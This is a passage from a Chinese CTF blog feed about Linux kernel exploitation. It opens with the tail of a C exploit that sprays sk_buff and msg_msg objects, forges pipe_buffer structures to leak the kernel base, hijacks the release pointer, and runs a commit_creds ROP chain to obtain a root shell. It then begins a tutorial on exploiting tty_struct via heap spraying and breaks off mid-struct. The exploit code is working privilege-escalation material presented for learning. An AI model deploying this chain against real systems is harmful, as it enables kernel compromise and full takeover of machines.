punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">buildMsg</span><span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">(</span>msg_msg <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_secondary_msg<span class=\"token punctuation\">,</span>\n        victim_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span> <span class=\"token punctuation\">,</span> victim_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">,</span>\n        VICTIM_MSG_TYPE<span class=\"token punctuation\">,</span>\n        SECONDARY_MSG_SIZE <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span> msg_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">spraySkBuff</span><span class=\"token punctuation\">(</span>sk_sockets <span class=\"token punctuation\">,</span> fake_secondary_msg<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to spray sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 再次伪造 msgmsg 结构体</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">readMsg</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">[</span>victim_qid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>secondary_msg<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> VICTIM_MSG_TYPE<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to receive secondary msg!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 从伪造 msgmsg 结构体读取，此时会释放掉 msgmsg 结构体</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> PIPE_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">pipe</span><span class=\"token punctuation\">(</span>pipe_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to create pipe!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>pipe_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"deadbeef\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to write the pipe!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sk_buf &lt;--> pipe_buf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 堆喷 pipe 结构体，此时 sk_buf 能控制 pipe_buf</span>\n\n    pipe_buf_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>pipe_buffer <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>fake_secondary_msg<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 将 buffer 转化为 pipe_buffer 结构体，从而找到内核指针</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> SOCKET_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> SK_BUFF_NUM<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>sk_sockets<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>fake_secondary_msg<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to release sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pipe_buf_ptr<span class=\"token operator\">-></span>ops <span class=\"token operator\">></span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                kernel_offset <span class=\"token operator\">=</span> pipe_buf_ptr<span class=\"token operator\">-></span>ops <span class=\"token operator\">-</span> ANON_PIPE_BUF_OPS<span class=\"token punctuation\">;</span>\n                kernel_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span> <span class=\"token operator\">+</span> kernel_offset<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 从众多的 sk_buf 中找到 pipe_buf</span>\n\n    <span class=\"token comment\">// 接下来就是劫持控制流了，劫持 pipe_buffer->ops->release</span>\n    <span class=\"token comment\">// 最后是 rop 链的构造环节</span>\n\n    pipe_buf_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>pipe_buffer <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>fake_secondary_msg<span class=\"token punctuation\">;</span>\n\n    pipe_buf_ptr<span class=\"token operator\">-></span>page <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>uint64_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"114514\"</span><span class=\"token punctuation\">;</span>\n    pipe_buf_ptr<span class=\"token operator\">-></span>ops <span class=\"token operator\">=</span> victim_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span>\n\n\n    ops_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>pipe_buf_operations <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>fake_secondary_msg<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    ops_ptr<span class=\"token operator\">-></span>release <span class=\"token operator\">=</span> PUSH_RSI_POP_RSP_POP_4VAL_RET <span class=\"token operator\">+</span> kernel_offset<span class=\"token punctuation\">;</span>\n\n    rop <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uint64_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>fake_secondary_msg<span class=\"token punctuation\">[</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> POP_RDI_RET <span class=\"token operator\">+</span> kernel_offset<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> INIT_CRED <span class=\"token operator\">+</span> kernel_offset<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> COMMIT_CREDS <span class=\"token operator\">+</span> kernel_offset<span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE <span class=\"token operator\">+</span> kernel_offset <span class=\"token operator\">+</span> <span class=\"token number\">22</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uint64_t<span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">lg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PUSH_RSI_POP_RSP_POP_4VAL_RET\"</span><span class=\"token punctuation\">,</span>PUSH_RSI_POP_RSP_POP_4VAL_RET <span class=\"token operator\">+</span> kernel_offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">spraySkBuff</span><span class=\"token punctuation\">(</span>sk_sockets<span class=\"token punctuation\">,</span> fake_secondary_msg<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to spray sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 往 sk_buf object 中写 fake_pipe_buffer 结构体从而控制某一 pipe_buffer</span>\n\n    <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> PIPE_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>pipe_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>pipe_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n",
            "tags": [
                "kernel",
                "C语言"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/",
            "url": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/",
            "title": "教你学内核-tty,seq结构体利用",
            "date_published": "2022-10-24T03:10:27.000Z",
            "content_html": "<blockquote>\n<p>确实没鸽</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"教你学内核-ttyseq\"><a class=\"markdownIt-Anchor\" href=\"#教你学内核-ttyseq\">#</a> 教你学内核 - tty,seq</h1>\n<h2 id=\"背景知识\"><a class=\"markdownIt-Anchor\" href=\"#背景知识\">#</a> 背景知识</h2>\n<h3 id=\"堆喷射\"><a class=\"markdownIt-Anchor\" href=\"#堆喷射\">#</a> 堆喷射</h3>\n<p>堆喷是啥？</p>\n<p>堆喷射（Heap Spraying），通过大量重复的操作，申请多个相同的堆块或者构造大量指针从而提高碰撞到该堆块或利用到该指针的概率。</p>\n<p>具体可以是存在一个 uaf 保存了一个已经 free 掉的指针，通过申请大量相同的结构体，从而提高该指针命中结构体的概率。</p>\n<h3 id=\"tty-设备结构体\"><a class=\"markdownIt-Anchor\" href=\"#tty-设备结构体\">#</a> tty 设备结构体</h3>\n<p>当我们打开 tty 设备时内核中便会创建一个 tty_struct，也就是说，打开  <code>/dev/ptmx</code>  会在内核中分配一个 tty_struct 结构体，相应地当我们将其关闭时该结构体便会被释放回 slab/slub 中</p>\n<p>tty_struct  结构体定义如下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span>    magic<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">kref</span> kref<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">device</span> <span class=\"token operator\">*</span>dev<span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* class device or NULL (e.g. ptys, serdev) */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_operations</span> <span class=\"token operator\">*</span>ops<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> index<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/* Protects ldisc changes: Lock tty not pty */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">ld_semaphore</span> ldisc_sem<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_ldisc</span> <span class=\"token operator\">*</span>ldisc<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">mutex</span> atomic_write_lock<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">mutex</span> legacy_mutex<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">mutex</span> throttle_mutex<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">rw_semaphore</span> termios_rwsem<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">mutex</span> winsize_mutex<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">/* Termios values are protected by the termios rwsem */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">ktermios</span> termios<span class=\"token punctuation\">,</span> termios_locked<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> flags<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> count<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">winsize</span> winsize<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* winsize_mutex */</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span>\n        spinlock_t lock<span class=\"token punctuation\">;</span>\n        bool stopped<span class=\"token punctuation\">;</span>\n        bool tco_stopped<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> unused<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token function\">__aligned</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> flow<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span>\n        spinlock_t lock<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">pid</span> <span class=\"token operator\">*</span>pgrp<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">pid</span> <span class=\"token operator\">*</span>session<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> pktstatus<span class=\"token punctuation\">;</span>\n        bool packet<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> unused<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token function\">__aligned</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> ctrl<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> hw_stopped<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> receive_room<span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* Bytes free for queue */</span>\n    <span class=\"token keyword\">int</span> flow_change<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>link<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">fasync_struct</span> <span class=\"token operator\">*</span>fasync<span class=\"token punctuation\">;</span>\n    wait_queue_head_t write_wait<span class=\"token punctuation\">;</span>\n    wait_queue_head_t read_wait<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_struct</span> hangup_work<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>disc_data<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>driver_data<span class=\"token punctuation\">;</span>\n    spinlock_t files_lock<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* protects tty_files list */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span> tty_files<span class=\"token punctuation\">;</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">N_TTY_BUF_SIZE <span class=\"token number\">4096</span></span></span>\n\n    <span class=\"token keyword\">int</span> closing<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>write_buf<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> write_cnt<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">/* If the tty has a pending do_SAK, queue it here - akpm */</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">work_struct</span> SAK_work<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_port</span> <span class=\"token operator\">*</span>port<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> __randomize_layout<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/* Each of a tty's open files has private_data pointing to tty_file_private */</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_file_private</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span>file<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span> list<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/* tty magic number */</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">TTY_MAGIC        <span class=\"token number\">0x5401</span></span></span></code></pre>\n<p>其中定义了结构体 魔数 TTY_MAGIC 0x5401，可以通过这个魔数判断该堆块是否是 tty 结构体，另外结构体中有一个函数表 <em>tty_operations</em> ，tty_op 为一个内核地址，可以通过它来泄露内核地址，我们在使用 read ioctl 等操作的时候，也会通过 tty_op 里保存的函数来实现对应的功能</p>\n<p>tty_operations 结构体定义如下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_operations</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>lookup<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span>filp<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>install<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>remove<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_driver</span> <span class=\"token operator\">*</span>driver<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>open<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span> tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span> filp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>close<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span> tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">*</span> filp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>shutdown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>cleanup<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span> tty<span class=\"token punctuation\">,</span>\n              <span class=\"token keyword\">const</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>put_char<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>flush_chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>write_room<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>chars_in_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> <span class=\"token operator\">*</span>tty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span>  <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ioctl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tty_struct</span> 